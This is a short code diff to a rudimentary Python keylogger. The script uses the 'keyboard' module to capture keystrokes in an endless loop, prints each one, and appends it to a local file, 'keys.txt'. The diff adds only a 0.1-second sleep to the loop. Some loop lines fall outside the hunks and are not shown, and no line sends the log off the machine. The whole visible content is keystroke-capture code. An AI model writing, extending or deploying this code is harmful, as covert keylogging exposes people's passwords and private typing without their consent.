@@ -1,4 +1,5 @@
 import keyboard as k
+from time import sleep
 
 f = open("keys.txt", "a")
 while 1 == 1:
@@ -9,4 +10,5 @@ while 1 == 1:
     print(key)
     key = key + "\n"
     f.writelines(key)
+    sleep(0.1)
 
